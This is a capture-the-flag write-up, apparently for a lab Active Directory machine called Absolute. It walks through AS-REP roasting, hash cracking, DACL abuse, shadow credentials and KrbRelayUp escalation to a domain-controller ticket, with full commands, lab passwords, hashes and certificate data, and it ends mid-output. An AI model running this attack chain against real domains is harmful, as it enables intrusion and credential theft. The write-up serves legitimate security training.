##### Tags: `AD`  `AS-REP Roasting`  `password spraying`  `bloodhound`  `RunasCs`  `KrbRelayUp`  `Rubeus` `exiftool`

# 🪟 Absolute (AD)🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 10.129.232.60
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-24 19:21:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
found 6 images in the website
```console
$ feroxbuster -u http://10.129.232.60 -w /usr/share/wordlists/dirb/common.txt -x php,txt,xml,zip -C 404
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.232.60/
 🚩  In-Scope Url          │ 10.129.232.60
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, xml, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────

200      GET     1306l     7961w   733740c http://10.129.232.60/images/hero_1.jpg
200      GET     2425l    11064w   656123c http://10.129.232.60/images/hero_2.jpg
200      GET      948l     7256w   690337c http://10.129.232.60/images/hero_3.jpg
200      GET     7808l    48362w  3771054c http://10.129.232.60/images/hero_4.jpg
200      GET    16021l    91957w  4194304c http://10.129.232.60/images/hero_6.jpg
200      GET     6692l    42749w  3290518c http://10.129.232.60/images/hero_5.jpg
```
download 6 images
```console
$ for i in $(seq 1 6); do wget http://10.129.232.60/images/hero_${i}.jpg; done
--2026-08-24 22:33:39--  http://10.129.232.60/images/hero_1.jpg
Connecting to 10.129.232.60:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 407495 (398K) [image/jpeg]
Saving to: ‘hero_1.jpg’
hero_1.jpg                       100%[==========================================================>] 397.94K  --.-KB/s    in 0.05s   

2026-08-24 22:33:39 (8.10 MB/s) - ‘hero_1.jpg’ saved [407495/407495]

--2026-08-24 22:33:39--  http://10.129.232.60/images/hero_2.jpg
Connecting to 10.129.232.60:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 374185 (365K) [image/jpeg]
Saving to: ‘hero_2.jpg’
hero_2.jpg                       100%[==========================================================>] 365.42K  1.38MB/s    in 0.3s    
```
found 6 usernames in the metadata of the images
```console
$ exiftool * | grep Author                                   
Author                          : James Roberts
Author                          : Michael Chaffrey
Author                          : Donald Klay
Author                          : Sarah Osvald
Author                          : Jeffer Robinson
Author                          : Nicole Smith
```
use username-anarchy to generate a combination of usernames
```console
./username-anarchy --input-file user.txt > usernames.txt

$ cat usernames.txt         
james
jamesroberts
james.roberts
jamesrob
jamerobe
jamesr
j.roberts
jroberts
rjames
r.james
robertsj
roberts
roberts.j
```
found the username pattern and got 6 real usernames
```console
$ nxc smb 10.129.232.60 -u usernames.txt -p '' --continue-on-success | grep STATUS_ACCOUNT_RESTRICTION
SMB                      10.129.232.60   445    DC               [-] absolute.htb\j.roberts: STATUS_ACCOUNT_RESTRICTION 
SMB                      10.129.232.60   445    DC               [-] absolute.htb\m.chaffrey: STATUS_ACCOUNT_RESTRICTION 
SMB                      10.129.232.60   445    DC               [-] absolute.htb\d.klay: STATUS_ACCOUNT_RESTRICTION 
SMB                      10.129.232.60   445    DC               [-] absolute.htb\s.osvald: STATUS_ACCOUNT_RESTRICTION 
SMB                      10.129.232.60   445    DC               [-] absolute.htb\j.robinson: STATUS_ACCOUNT_RESTRICTION 
SMB                      10.129.232.60   445    DC               [-] absolute.htb\n.smith: STATUS_ACCOUNT_RESTRICTION
```
put all username in user.txt and AS-REP Roasting found d.klay and the hash
```console
$ impacket-GetNPUsers -dc-ip dc.absolute.htb -usersfile user.txt absolute.htb/
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User j.roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.chaffrey doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$d.klay@ABSOLUTE.HTB:01d16d8e2622e4af06a6ef4ac3f67dbc$ab00335df6a71ea10bc5e72c3ac1877206e6754b669a08d7651b7f9ff5ec5105b1b267bcc3786b3434d47dd48c1e6c6eb4322282035a05c0d1de78e7850d34d0265ed66927a665a75911c6bc13e15d80c11abe3522b97f7a8f4b1ed188ef0c10f098cf07748eebdfdf8c4c381d9a4ffabbd0eaa5d8f8302bc124a1300b158f0212a70f5c1dd8aaebbb3b72929ae65c0bb831066a906d6b3405a3c120d86bc3658e2833fc7badc8d1997d3e0e98e9990463ceebce551c0f1068709529f8cb66b029247987f5908fc9158933b25e11625c4074dff23235da44f4be801c24acb89e2b9689ca95670fae9276682e
[-] User s.osvald doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
```
cracked and got d.klay:Darkmoonsky248girl
```console
$ hashcat -m 18200 hash.txt /home/ming/Downloads/rockyou.txt

d.klay
Darkmoonsky248girl
```
credential only works with Kerberos authentication 
```console
$ nxc smb 10.129.232.60 -u d.klay -p 'Darkmoonsky248girl' -k
SMB         10.129.232.60   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)                                                                                                           
SMB         10.129.232.60   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
```
found the plaintext password for svc_smb:AbsoluteSMBService123!
```console
$ nxc smb 10.129.232.60 -u d.klay -p 'Darkmoonsky248girl' -k --users                                                  
SMB         10.129.232.60   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)                                                                                                           
SMB         10.129.232.60   445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl 
SMB         10.129.232.60   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-         
SMB         10.129.232.60   445    DC               Administrator                 2022-06-09 08:25:57 0       Built-in account for administering the computer/domain
SMB         10.129.232.60   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain                                   
SMB         10.129.232.60   445    DC               krbtgt                        2022-06-09 08:16:38 0       Key Distribution Center Service Account                                                    
SMB         10.129.232.60   445    DC               J.Roberts                     2022-06-09 08:25:51 0        
SMB         10.129.232.60   445    DC               M.Chaffrey                    2022-06-09 08:25:51 0        
SMB         10.129.232.60   445    DC               D.Klay                        2022-06-09 08:25:51 0        
SMB         10.129.232.60   445    DC               s.osvald                      2022-06-09 08:25:51 0        
SMB         10.129.232.60   445    DC               j.robinson                    2022-06-09 08:25:51 0        
SMB         10.129.232.60   445    DC               n.smith                       2022-06-09 08:25:51 0        
SMB         10.129.232.60   445    DC               m.lovegod                     2022-06-09 08:25:51 0        
SMB         10.129.232.60   445    DC               l.moore                       2022-06-09 08:25:51 0        
SMB         10.129.232.60   445    DC               c.colt                        2022-06-09 08:25:51 0        
SMB         10.129.232.60   445    DC               s.johnson                     2022-06-09 08:25:51 0        
SMB         10.129.232.60   445    DC               d.lemm                        2022-06-09 08:25:51 0        
SMB         10.129.232.60   445    DC               svc_smb                       2022-06-09 08:25:51 0       AbsoluteSMBService123!
SMB         10.129.232.60   445    DC               svc_audit                     2022-06-09 08:25:51 0        
SMB         10.129.232.60   445    DC               winrm_user                    2022-06-09 08:25:51 0       Used to perform simple network tasks                                                       
```
found 2 files in the shared folder
```console
$ ./smbclient.py 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
Type help for list of commands
# use shared
# ls
drw-rw-rw-          0  Fri Sep  2 03:02:23 2022 .
drw-rw-rw-          0  Fri Sep  2 03:02:23 2022 ..
-rw-rw-rw-         72  Fri Sep  2 03:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Fri Sep  2 03:02:23 2022 test.exe
```
run test.exe and use wireshark to capture it and found _ldap._tcp.dc.absolute.htb  
add it and run the test.exe again  
found the plaintext credential in wireshark m.lovegod:AbsoluteLDAP2022!  
is vaild for Kerberos authentication 
```console
$ nxc smb 10.129.232.60 -u m.lovegod -p 'AbsoluteLDAP2022!' -k
SMB         10.129.232.60   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.60   445    DC               [+] absolute.htb\m.lovegod:AbsoluteLDAP2022! 
```
download the data for bloodhound analyse 
```console
$ nxc ldap 10.129.232.60 -u d.klay -p 'Darkmoonsky248girl' -k --bloodhound --collection All --dns-server 10.129.232.60
```
## Attack Path
bloodhound found m.lovegod is a member of networkers group  
networkers group can addmember to network audit group  
network audit group has Genericall over winrm_user  
winrm_user can remote login to the machine  
```console
request and obtain a Kerberos Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC) of an Active Directory domain

$ kinit m.lovegod
Password for m.lovegod@ABSOLUTE.HTB: AbsoluteLDAP2022!
```
export the ticket
```console
$ export KRB5CCNAME=/tmp/krb5cc_1000
```
modify the Access Control List (ACL) of a target Active Directory 
```console
$ impacket-dacledit -k 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb -principal m.lovegod -target "Network Audit" -action write -rights WriteMembers
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260826-012951.bak
[*] DACL modified successfully!
```
add m.lovegod to Network Audit group
```console
$ net rpc group addmem "Network Audit" m.lovegod -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:
```
confirm hes in the group
```console
$ net rpc group members "Network Audit" -U 'm.lovegod' --use-kerberos=required -S dc.absolute.htb
Password for [WORKGROUP\m.lovegod]:
absolute\m.lovegod
absolute\svc_audit
```
remove the ticket
```console
$ rm -f /tmp/krb5cc_1000
```
re-create a new ticket
```console
$ kinit m.lovegod
Password for m.lovegod@ABSOLUTE.HTB: 
```
request a credential cache and NTLM hash
```console
$ certipy shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: dc.absolute.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: ABSOLUTE.HTB.
[!] Use -debug to print a stacktrace
[*] Targeting user 'winrm_user'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2ebad60814b54456b214a9ba8a36af88'
[*] Adding Key Credential with device ID '2ebad60814b54456b214a9ba8a36af88' to the Key Credentials for 'winrm_user'
[-] Could not update Key Credentials for 'winrm_user' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```
login with the cache
```console
$ KRB5CCNAME=./winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb
                                        
Evil-WinRM shell v3.7
*Evil-WinRM* PS C:\Users\winrm_user\Documents> whoami
absolute\winrm_user
```
## Privilege Escalation
Winpeas shows the KrbRelayUP is vulnerable  
the machine is Windows 10
```console
*Evil-WinRM* PS C:\temp> cmd /c ver
Microsoft Windows [Version 10.0.17763.3406]
```
upload all 3 attacking items
```console
*Evil-WinRM* PS C:\temp> ls

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/25/2026   9:11 AM         442880 KrbRelayUp.exe
-a----        8/25/2026   8:46 AM         278016 Rubeus.exe
-a----        8/25/2026   8:38 AM          51712 RunasCs.exe
```
we also need the CLSID we can find here for Windows 10
```console
https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise
```
uses RunasCs to execute KrbRelayUp.exe locally and request for the ce certificate
```console
*Evil-WinRM* PS C:\temp> .\RunasCs.exe m.lovegod AbsoluteLDAP2022! -d absolute.htb -l 9 "C:\temp\KrbRelayUp.exe relay -m shadowcred -cls {752073A1-23F2-4396-85F0-8FDB879ED0ED}"

KrbRelayUp - Relaying you to SYSTEM


[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] Generating certificate
[+] Certificate generated
[+] Generating KeyCredential
[+] KeyCredential generated with DeviceID ba2025ee-0b9e-4649-a044-f10bb8bb33db
[+] KeyCredential added successfully
[+] Run the spawn method for SYSTEM shell:
    ./KrbRelayUp.exe spawn -m shadowcred -d absolute.htb -dc dc.absolute.htb -ce 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 -cep sI0@bM7/sI3#
```
use the ce certificate to get the base64(ticket.kirbi)
```console
*Evil-WinRM* PS C:\temp> .\Rubeus.exe asktgt /user:DC$ /certificate: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 /password:'sI0@bM7/sI3#' /getcredentials /show /nowrap
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN="CN=DC", OU=Domain Controllers, DC=absolute, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'absolute.htb\DC$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGGDCCBhSgAwIBBaEDAgEWooIFMjCCBS5hggUqMIIFJqADAgEFoQ4bDEFCU09MVVRFLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMYWJzb2x1dGUuaHRio4IE6jCCBOagAwIBEqEDAgECooIE2ASCBNRS6sb9egAMzOK8eMVzXTLCqAAlWI8e8Gw8efps61SLxgsO+eMaMy5tDoVe43TBn1+ND3CxbTAlxMeFN8sLAv8hJQM/2le7PjO2SiIE+gd4vP/H2x7fHYq5GB1N+ty6EyRcZ057rEQzkX1vjB/MYf44YT1CgaOYQjvGyPPUxipQoV/DmygPdEkhX6GFEg7pzXyVFAgbJWhLeityc5aUjREqtTZU+1MTMOQJ/BQFMiiNAmNM0WWZJ/ApCEqziILVOk9r0tE7Kwv9NUF8Mw8/PwzWPije36YFHowavJbmd0yhjnOVhJABZNPSvEkCP97kyDBYl6zMudG34QL+Sq3WKpjEh5FufrJGBSss4Mnvb+QVZtEP9DA1oLF8cmgaNaOKzwITI/kieA0OEWrE6T7b7L5FTck9tiY1CkavklMvtRIizOTUeL7Pu2CJVAOobBezatjIGd1eJfQtGpfKxMzxzOesVn88foLRc8BA5XLlTz2kFoIh0JT5t6MVqTTycth1t+ntsjWBUpVyTL3KaWPX8kZ4XvUP34ax1G+cStvp6Rk0y+chTWqYIm7Oi81zShDmXYMOC5nNCnmJ/A4d/sPWAKcWAqoAsJVxne/SNSH08FeXkbEuOFqQ/Y